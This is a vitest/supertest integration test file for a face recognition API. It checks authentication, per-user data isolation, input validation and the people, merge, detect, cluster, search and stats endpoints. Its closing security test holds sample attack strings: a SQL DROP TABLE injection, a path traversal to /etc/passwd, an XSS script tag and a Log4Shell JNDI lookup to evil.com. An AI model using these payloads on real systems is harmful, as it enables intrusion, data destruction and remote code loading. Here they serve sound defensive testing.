// AI-META-BEGIN
// AI-META: Integration tests for face recognition API endpoints
// OWNERSHIP: server/api
// ENTRYPOINTS: run by test runner for API validation
// DEPENDENCIES: supertest, vitest, ./face-routes, ../db
// DANGER: Tests validate biometric data handling and privacy controls
// CHANGE-SAFETY: Maintain test coverage for all face recognition endpoints
// TESTS: npm run test server/face-routes.test.ts
// AI-META-END

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import request from "supertest";
import { app } from "./app";
import { db } from "./db";
import { users, photos, faces, people } from "../shared/schema";
import { eq } from "drizzle-orm";
import {
  generateTestUser,
  generateTestPhoto,
  generateTestPerson,
  setupTestDatabase,
  cleanupTestDatabase,
} from "../tests/factories";

describe("Face Recognition API", () => {
  let testUser: any;
  let authToken: string;
  let testPhoto: any;
  let testPerson: any;

  beforeEach(async () => {
    await setupTestDatabase();

    // Create test user
    testUser = await generateTestUser();

    // Create test photo
    testPhoto = await generateTestPhoto(testUser.id);

    // Create test person
    testPerson = await generateTestPerson(testUser.id);

    // Get auth token (in a real app, this would be a JWT token)
    authToken = `Bearer ${testUser.id}`;
  });

  afterEach(async () => {
    await cleanupTestDatabase();
  });

  describe("GET /api/faces/people", () => {
    it("should return all people for authenticated user", async () => {
      const response = await request(app)
        .get("/api/faces/people")
        .set("Authorization", authToken)
        .expect(200);

      expect(response.body).toHaveProperty("people");
      expect(response.body).toHaveProperty("count");
      expect(Array.isArray(response.body.people)).toBe(true);
      expect(response.body.count).toBe(response.body.people.length);
    });

    it("should require authentication", async () => {
      await request(app).get("/api/faces/people").expect(401);
    });

    it("should only return people belonging to authenticated user", async () => {
      // Create another user
      const otherUser = await generateTestUser();
      const otherPerson = await generateTestPerson(otherUser.id);
      const otherToken = `Bearer ${otherUser.id}`;

      // First user should only see their own people
      const response1 = await request(app)
        .get("/api/faces/people")
        .set("Authorization", authToken)
        .expect(200);

      expect(response1.body.people).toHaveLength(1);
      expect(response1.body.people[0].id).toBe(testPerson.id);

      // Other user should only see their own people
      const response2 = await request(app)
        .get("/api/faces/people")
        .set("Authorization", otherToken)
        .expect(200);

      expect(response2.body.people).toHaveLength(1);
      expect(response2.body.people[0].id).toBe(otherPerson.id);
    });
  });

  describe("PUT /api/faces/people/:id", () => {
    it("should update person information", async () => {
      const updates = {
        name: "John Doe",
        isPinned: true,
      };

      const response = await request(app)
        .put(`/api/faces/people/${testPerson.id}`)
        .set("Authorization", authToken)
        .send(updates)
        .expect(200);

      expect(response.body).toHaveProperty("person");
      expect(response.body.person.name).toBe("John Doe");
      expect(response.body.person.isPinned).toBe(true);
      expect(response.body).toHaveProperty("message");
    });

    it("should return 404 for non-existent person", async () => {
      await request(app)
        .put("/api/faces/people/non-existent-id")
        .set("Authorization", authToken)
        .send({ name: "Test" })
        .expect(404);
    });

    it("should validate request body", async () => {
      await request(app)
        .put(`/api/faces/people/${testPerson.id}`)
        .set("Authorization", authToken)
        .send({ name: 123 }) // Invalid type
        .expect(400);
    });

    it("should prevent updating other users' people", async () => {
      const otherUser = await generateTestUser();
      const otherPerson = await generateTestPerson(otherUser.id);
      const otherToken = `Bearer ${otherUser.id}`;

      await request(app)
        .put(`/api/faces/people/${testPerson.id}`)
        .set("Authorization", otherToken)
        .send({ name: "Hacker" })
        .expect(404); // Should return 404, not 403 (security through obscurity)
    });
  });

  describe("PUT /api/faces/people/:id/merge", () => {
    it("should merge two people", async () => {
      const targetPerson = await generateTestPerson(testUser.id);

      const response = await request(app)
        .put(`/api/faces/people/${testPerson.id}/merge`)
        .set("Authorization", authToken)
        .send({ targetPersonId: targetPerson.id })
        .expect(200);

      expect(response.body).toHaveProperty("person");
      expect(response.body).toHaveProperty("message");
      expect(response.body.message).toBe("People merged successfully");

      // Verify source person is deleted
      await request(app)
        .get(`/api/faces/people/${testPerson.id}`)
        .set("Authorization", authToken)
        .expect(404);
    });

    it("should prevent merging person with themselves", async () => {
      await request(app)
        .put(`/api/faces/people/${testPerson.id}/merge`)
        .set("Authorization", authToken)
        .send({ targetPersonId: testPerson.id })
        .expect(400);
    });

    it("should validate request body", async () => {
      await request(app)
        .put(`/api/faces/people/${testPerson.id}/merge`)
        .set("Authorization", authToken)
        .send({ targetPersonId: "invalid-uuid" })
        .expect(400);
    });
  });

  describe("GET /api/faces/people/:id/photos", () => {
    it("should return photos for a specific person", async () => {
      // Create some faces for the person
      await db.insert(faces).values({
        id: `face-1`,
        photoId: testPhoto.id,
        embedding: new Array(128).fill(0.5),
        boundingBox: { x: 10, y: 10, width: 100, height: 100 },
        confidence: 0.9,
        personId: testPerson.id,
      });

      const response = await request(app)
        .get(`/api/faces/people/${testPerson.id}/photos`)
        .set("Authorization", authToken)
        .expect(200);

      expect(response.body).toHaveProperty("photos");
      expect(response.body).toHaveProperty("pagination");
      expect(Array.isArray(response.body.photos)).toBe(true);
      expect(response.body.pagination).toHaveProperty("limit");
      expect(response.body.pagination).toHaveProperty("offset");
      expect(response.body.pagination).toHaveProperty("total");
    });

    it("should support pagination", async () => {
      const response = await request(app)
        .get(`/api/faces/people/${testPerson.id}/photos?limit=10&offset=0`)
        .set("Authorization", authToken)
        .expect(200);

      expect(response.body.pagination.limit).toBe(10);
      expect(response.body.pagination.offset).toBe(0);
    });

    it("should return 404 for non-existent person", async () => {
      await request(app)
        .get("/api/faces/people/non-existent-id/photos")
        .set("Authorization", authToken)
        .expect(404);
    });
  });

  describe("POST /api/faces/detect", () => {
    it("should trigger face detection for a photo", async () => {
      const response = await request(app)
        .post("/api/faces/detect")
        .set("Authorization", authToken)
        .send({ photoId: testPhoto.id })
        .expect(200);

      expect(response.body).toHaveProperty("faces");
      expect(response.body).toHaveProperty("count");
      expect(response.body).toHaveProperty("message");
      expect(Array.isArray(response.body.faces)).toBe(true);
    });

    it("should return existing faces if already detected", async () => {
      // Create existing faces
      await db.insert(faces).values({
        id: `face-existing`,
        photoId: testPhoto.id,
        embedding: new Array(128).fill(0.5),
        boundingBox: { x: 10, y: 10, width: 100, height: 100 },
        confidence: 0.9,
      });

      const response = await request(app)
        .post("/api/faces/detect")
        .set("Authorization", authToken)
        .send({ photoId: testPhoto.id })
        .expect(200);

      expect(response.body.message).toBe(
        "Faces already detected for this photo",
      );
      expect(response.body.faces).toHaveLength(1);
    });

    it("should validate request body", async () => {
      await request(app)
        .post("/api/faces/detect")
        .set("Authorization", authToken)
        .send({ photoId: "invalid-uuid" })
        .expect(400);
    });

    it("should return 404 for non-existent photo", async () => {
      await request(app)
        .post("/api/faces/detect")
        .set("Authorization", authToken)
        .send({ photoId: "non-existent-photo-id" })
        .expect(404);
    });

    it("should prevent detecting faces in other users' photos", async () => {
      const otherUser = await generateTestUser();
      const otherPhoto = await generateTestPhoto(otherUser.id);
      const otherToken = `Bearer ${otherUser.id}`;

      await request(app)
        .post("/api/faces/detect")
        .set("Authorization", authToken)
        .send({ photoId: otherPhoto.id })
        .expect(404);
    });
  });

  describe("POST /api/faces/cluster", () => {
    it("should cluster unassigned faces", async () => {
      // Create some unassigned faces
      await db.insert(faces).values([
        {
          id: `face-1`,
          photoId: testPhoto.id,
          embedding: new Array(128).fill(0.5),
          boundingBox: { x: 10, y: 10, width: 100, height: 100 },
          confidence: 0.9,
        },
        {
          id: `face-2`,
          photoId: testPhoto.id,
          embedding: new Array(128).fill(0.51),
          boundingBox: { x: 20, y: 20, width: 100, height: 100 },
          confidence: 0.8,
        },
      ]);

      const response = await request(app)
        .post("/api/faces/cluster")
        .set("Authorization", authToken)
        .expect(200);

      expect(response.body).toHaveProperty("newPeople");
      expect(response.body).toHaveProperty("count");
      expect(response.body).toHaveProperty("message");
      expect(Array.isArray(response.body.newPeople)).toBe(true);
    });

    it("should require authentication", async () => {
      await request(app).post("/api/faces/cluster").expect(401);
    });
  });

  describe("GET /api/faces/search", () => {
    it("should search for similar faces using embedding", async () => {
      const embedding = new Array(128).fill(0.5);

      const response = await request(app)
        .get("/api/faces/search")
        .set("Authorization", authToken)
        .query({
          embedding: JSON.stringify(embedding),
          threshold: 0.6,
          limit: 5,
        })
        .expect(200);

      expect(response.body).toHaveProperty("similarFaces");
      expect(response.body).toHaveProperty("count");
      expect(response.body).toHaveProperty("threshold");
      expect(Array.isArray(response.body.similarFaces)).toBe(true);
    });

    it("should search for similar faces using faceId", async () => {
      // Create a face with embedding
      const faceId = `face-search-test`;
      await db.insert(faces).values({
        id: faceId,
        photoId: testPhoto.id,
        embedding: new Array(128).fill(0.5),
        boundingBox: { x: 10, y: 10, width: 100, height: 100 },
        confidence: 0.9,
      });

      const response = await request(app)
        .get("/api/faces/search")
        .set("Authorization", authToken)
        .query({ faceId })
        .expect(200);

      expect(response.body).toHaveProperty("similarFaces");
      expect(Array.isArray(response.body.similarFaces)).toBe(true);
    });

    it("should validate query parameters", async () => {
      // Test invalid embedding
      await request(app)
        .get("/api/faces/search")
        .set("Authorization", authToken)
        .query({ embedding: "invalid-json" })
        .expect(400);

      // Test missing embedding and faceId
      await request(app)
        .get("/api/faces/search")
        .set("Authorization", authToken)
        .expect(400);

      // Test invalid faceId
      await request(app)
        .get("/api/faces/search")
        .set("Authorization", authToken)
        .query({ faceId: "invalid-uuid" })
        .expect(400);
    });

    it("should require authentication", async () => {
      await request(app).get("/api/faces/search").expect(401);
    });
  });

  describe("DELETE /api/faces/people/:id", () => {
    it("should delete a person and unassign their faces", async () => {
      // Create a face assigned to the person
      await db.insert(faces).values({
        id: `face-to-unassign`,
        photoId: testPhoto.id,
        embedding: new Array(128).fill(0.5),
        boundingBox: { x: 10, y: 10, width: 100, height: 100 },
        confidence: 0.9,
        personId: testPerson.id,
      });

      const response = await request(app)
        .delete(`/api/faces/people/${testPerson.id}`)
        .set("Authorization", authToken)
        .expect(200);

      expect(response.body).toHaveProperty("message");
      expect(response.body).toHaveProperty("personId");
      expect(response.body.message).toBe("Person deleted successfully");

      // Verify person is deleted
      await request(app)
        .get(`/api/faces/people/${testPerson.id}`)
        .set("Authorization", authToken)
        .expect(404);

      // Verify face is unassigned
      const unassignedFace = await db
        .select()
        .from(faces)
        .where(eq(faces.id, "face-to-unassign"))
        .limit(1);

      expect(unassignedFace[0].personId).toBeNull();
    });

    it("should return 404 for non-existent person", async () => {
      await request(app)
        .delete("/api/faces/people/non-existent-id")
        .set("Authorization", authToken)
        .expect(404);
    });

    it("should prevent deleting other users' people", async () => {
      const otherUser = await generateTestUser();
      const otherPerson = await generateTestPerson(otherUser.id);
      const otherToken = `Bearer ${otherUser.id}`;

      await request(app)
        .delete(`/api/faces/people/${testPerson.id}`)
        .set("Authorization", otherToken)
        .expect(404);
    });
  });

  describe("GET /api/faces/stats", () => {
    it("should return face recognition statistics", async () => {
      // Create some test data
      await db.insert(faces).values([
        {
          id: `face-1`,
          photoId: testPhoto.id,
          embedding: new Array(128).fill(0.5),
          boundingBox: { x: 10, y: 10, width: 100, height: 100 },
          confidence: 0.9,
          personId: testPerson.id,
        },
        {
          id: `face-2`,
          photoId: testPhoto.id,
          embedding: new Array(128).fill(0.51),
          boundingBox: { x: 20, y: 20, width: 100, height: 100 },
          confidence: 0.8,
        },
      ]);

      const response = await request(app)
        .get("/api/faces/stats")
        .set("Authorization", authToken)
        .expect(200);

      expect(response.body).toHaveProperty("totalFaces");
      expect(response.body).toHaveProperty("assignedFaces");
      expect(response.body).toHaveProperty("unassignedFaces");
      expect(response.body).toHaveProperty("totalPeople");
      expect(response.body).toHaveProperty("namedPeople");
      expect(response.body).toHaveProperty("unnamedPeople");

      expect(typeof response.body.totalFaces).toBe("number");
      expect(typeof response.body.assignedFaces).toBe("number");
      expect(typeof response.body.unassignedFaces).toBe("number");
      expect(typeof response.body.totalPeople).toBe("number");
      expect(typeof response.body.namedPeople).toBe("number");
      expect(typeof response.body.unnamedPeople).toBe("number");

      // Verify the math adds up
      expect(response.body.assignedFaces + response.body.unassignedFaces).toBe(
        response.body.totalFaces,
      );
      expect(response.body.namedPeople + response.body.unnamedPeople).toBe(
        response.body.totalPeople,
      );
    });

    it("should require authentication", async () => {
      await request(app).get("/api/faces/stats").expect(401);
    });

    it("should only return stats for authenticated user", async () => {
      const otherUser = await generateTestUser();
      const otherToken = `Bearer ${otherUser.id}`;

      // Create data for both users
      await db.insert(faces).values({
        id: `face-user1`,
        photoId: testPhoto.id,
        embedding: new Array(128).fill(0.5),
        boundingBox: { x: 10, y: 10, width: 100, height: 100 },
        confidence: 0.9,
        personId: testPerson.id,
      });

      const otherPhoto = await generateTestPhoto(otherUser.id);
      const otherPerson = await generateTestPerson(otherUser.id);
      await db.insert(faces).values({
        id: `face-user2`,
        photoId: otherPhoto.id,
        embedding: new Array(128).fill(0.5),
        boundingBox: { x: 10, y: 10, width: 100, height: 100 },
        confidence: 0.9,
        personId: otherPerson.id,
      });

      // First user should only see their own stats
      const response1 = await request(app)
        .get("/api/faces/stats")
        .set("Authorization", authToken)
        .expect(200);

      expect(response1.body.totalFaces).toBe(1);
      expect(response1.body.totalPeople).toBe(1);

      // Other user should only see their own stats
      const response2 = await request(app)
        .get("/api/faces/stats")
        .set("Authorization", otherToken)
        .expect(200);

      expect(response2.body.totalFaces).toBe(1);
      expect(response2.body.totalPeople).toBe(1);
    });
  });

  describe("Error Handling", () => {
    it("should handle malformed requests gracefully", async () => {
      await request(app)
        .put("/api/faces/people/invalid-id")
        .set("Authorization", authToken)
        .send({ name: { invalid: "object" } })
        .expect(400);
    });

    it("should handle database errors gracefully", async () => {
      // Simulate database error by using invalid person ID format
      await request(app)
        .get("/api/faces/people/invalid-uuid/photos")
        .set("Authorization", authToken)
        .expect(400);
    });

    it("should maintain user isolation in error conditions", async () => {
      const otherUser = await generateTestUser();
      const otherToken = `Bearer ${otherUser.id}`;

      // Even with errors, user isolation should be maintained
      await request(app)
        .get("/api/faces/people")
        .set("Authorization", otherToken)
        .expect(200)
        .then((response) => {
          expect(response.body.people).not.toContain(
            expect.objectContaining({ id: testPerson.id }),
          );
        });
    });
  });

  describe("Security", () => {
    it("should reject requests without proper authentication", async () => {
      await request(app)
        .get("/api/faces/people")
        .set("Authorization", "invalid-token")
        .expect(401);

      await request(app)
        .get("/api/faces/people")
        .set("Authorization", "")
        .expect(401);

      await request(app).get("/api/faces/people").expect(401);
    });

    it("should prevent cross-user data access", async () => {
      const otherUser = await generateTestUser();
      const otherToken = `Bearer ${otherUser.id}`;

      // Try to access first user's data with other user's token
      await request(app)
        .get(`/api/faces/people/${testPerson.id}`)
        .set("Authorization", otherToken)
        .expect(404);

      await request(app)
        .put(`/api/faces/people/${testPerson.id}`)
        .set("Authorization", otherToken)
        .send({ name: "Hacked" })
        .expect(404);

      await request(app)
        .delete(`/api/faces/people/${testPerson.id}`)
        .set("Authorization", otherToken)
        .expect(404);
    });

    it("should validate input to prevent injection attacks", async () => {
      // Test SQL injection attempts
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "../../../etc/passwd",
        "<script>alert('xss')</script>",
        "${jndi:ldap://evil.com/a}",
      ];

      for (const input of maliciousInputs) {
        await request(app)
          .get(`/api/faces/people/${input}`)
          .set("Authorization", authToken)
          .expect(404); // Should return 404, not 500

        await request(app)
          .put(`/api/faces/people/${input}`)
          .set("Authorization", authToken)
          .send({ name: input })
          .expect(404);
      }
    });
  });
});
